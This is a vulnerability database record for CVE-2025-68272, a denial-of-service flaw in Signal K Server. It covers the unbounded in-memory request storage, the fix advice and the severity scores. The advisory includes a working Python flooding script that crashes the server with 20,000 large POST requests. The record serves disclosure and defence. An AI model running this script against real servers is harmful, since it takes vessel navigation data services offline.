vulnerability_id: VCID-4wmk-79dr-uqdq
aliases:
  - CVE-2025-68272
  - GHSA-7rqc-ff8m-7j23
summary: "Signal K Server Vulnerable to Denial of Service via Unrestricted Access Request Flooding\n\
  ### Summary\nA Denial of Service (DoS) vulnerability allows an unauthenticated attacker to\
  \ crash the SignalK Server by flooding the access request endpoint (`/signalk/v1/access/requests`).\
  \ This causes a \"JavaScript heap out of memory\" error due to unbounded in-memory storage\
  \ of request objects.\n\n### Details\nThe vulnerability is caused by a lack of rate limiting\
  \ and improper memory management for incoming access requests.\n\n**Vulnerable Code Analysis:**\n\
  1.  **In-Memory Storage**: In `src/requestResponse.js`, requests are stored in a simple JavaScript\
  \ object:\n    ```javascript\n    const requests = {}\n    ```\n2.  **Unbounded Growth**:\
  \ The `createRequest` function adds new requests to this object without checking the current\
  \ size or count of existing requests.\n3.  **Infrequent Pruning**: The `pruneRequests` function,\
  \ which removes old requests, runs only once every **15 minutes** (`pruneIntervalRate`).\n\
  4.  **No Rate Limiting**: The endpoint `/signalk/v1/access/requests` accepts POST requests\
  \ from any client without any rate limiting or authentication (by design, as it's for initial\
  \ access requests).\n\n**Exploit Scenario:**\n1.  An attacker sends a large number of POST\
  \ requests (e.g., 20,000+) or requests with large payloads to `/signalk/v1/access/requests`.\n\
  2.  The server stores every request in the `requests` object in the Node.js heap.\n3.  The\
  \ heap memory usage spikes rapidly.\n4.  The Node.js process hits its memory limit (default\
  \ ~1.5GB) and crashes with `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation\
  \ failed - JavaScript heap out of memory`.\n\n### PoC\nThe following Python script reproduces\
  \ the crash by flooding the server with requests containing 100KB payloads.\n\n```python\n\
  import urllib.request\nimport json\nimport threading\nimport time\n\n# Target Configuration\n\
  TARGET_URL = \"http://localhost:3000/signalk/v1/access/requests\"\nPAYLOAD_SIZE_MB = 0.1 \
  \ # 100 KB per request\nNUM_REQUESTS = 20000   # Sufficient to exhaust heap\nCONCURRENCY =\
  \ 50\n\n# Generate a large string payload\nLARGE_STRING = \"A\" * (int(PAYLOAD_SIZE_MB * 1024\
  \ * 1024))\n\ndef send_heavy_request(i):\n    try:\n        payload = {\n            \"clientId\"\
  : f\"attacker-device-{i}\",\n            \"description\": LARGE_STRING, # Stored in memory!\n\
  \            \"permissions\": \"readwrite\"\n        }\n        data = json.dumps(payload).encode('utf-8')\n\
  \        \n        req = urllib.request.Request(\n            TARGET_URL, \n            data=data,\
  \ \n            headers={'Content-Type': 'application/json'}, \n            method='POST'\n\
  \        )\n        # Short timeout as server might hang\n        urllib.request.urlopen(req,\
  \ timeout=5)\n    except:\n        pass\n\ndef attack():\n    print(f\"[*] Starting DoS Attack\
  \ on {TARGET_URL}...\")\n    threads = []\n    for i in range(NUM_REQUESTS):\n        t =\
  \ threading.Thread(target=send_heavy_request, args=(i,))\n        threads.append(t)\n    \
  \    t.start()\n        \n        if len(threads) >= CONCURRENCY:\n            for t in threads:\
  \ t.join()\n            threads = []\n\nif __name__ == \"__main__\":\n    attack()\n```\n\n\
  **Expected Result:**\nMonitor the server process. Memory usage will increase rapidly, and\
  \ the server will eventually terminate with an Out of Memory (OOM) error.\n\n### Impact\n\
  **Verified Denial of Service**:\nDuring our verification using the provided PoC, we observed\
  \ the following:\n1.  **Rapid Memory Exhaustion**: The Node.js process memory usage increased\
  \ by approximately **30MB within seconds** of starting the attack.\n2.  **Service Instability**:\
  \ Continued execution of the PoC quickly leads to a `FATAL ERROR: Ineffective mark-compacts\
  \ near heap limit Allocation failed - JavaScript heap out of memory` crash.\n3.  **Service\
  \ Unavailability**: The server becomes completely unresponsive and terminates, requiring a\
  \ manual restart to recover. This allows an unauthenticated attacker to easily take the vessel's\
  \ navigation data server offline.\n\n---\n### Remediation\n**1. Implement Rate Limiting**\n\
  Use a middleware like `express-rate-limit` to restrict the number of requests from a single\
  \ IP address to `/signalk/v1/access/requests`.\n\n**2. Limit Request Storage**\nModify `src/requestResponse.js`\
  \ to enforce a maximum number of stored requests (e.g., 100). If the limit is reached, reject\
  \ new requests or evict the oldest ones immediately.\n\n**3. Validate Payload Size**\nEnforce\
  \ strict limits on the size of the `description` and other fields in the access request payload."
severities:
  - score: '0.00107'
    scoring_system: epss
    scoring_elements: '0.29626'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68272
  - score: '0.00107'
    scoring_system: epss
    scoring_elements: '0.29588'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68272
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-7rqc-ff8m-7j23
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/SignalK/signalk-server
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/SignalK/signalk-server
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/SignalK/signalk-server/commit/55e3574d8266fbc0ed8e453ad4557073541566f5
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/SignalK/signalk-server/commit/55e3574d8266fbc0ed8e453ad4557073541566f5
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2026-01-02T18:55:06Z/
    published_at: None
    url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-7rqc-ff8m-7j23
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-7rqc-ff8m-7j23
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-7rqc-ff8m-7j23
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2026-01-02T18:55:06Z/
    published_at: None
    url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-7rqc-ff8m-7j23
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-68272
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-68272
weaknesses:
  - CWE-770
  - CWE-400
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-68272
    reference_type:
    reference_id:
  - url: https://github.com/SignalK/signalk-server
    reference_type:
    reference_id:
  - url: https://github.com/SignalK/signalk-server/commit/55e3574d8266fbc0ed8e453ad4557073541566f5
    reference_type:
    reference_id:
  - url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
    reference_type:
    reference_id:
  - url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-7rqc-ff8m-7j23
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-68272
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-7rqc-ff8m-7j23
    reference_type:
    reference_id: GHSA-7rqc-ff8m-7j23
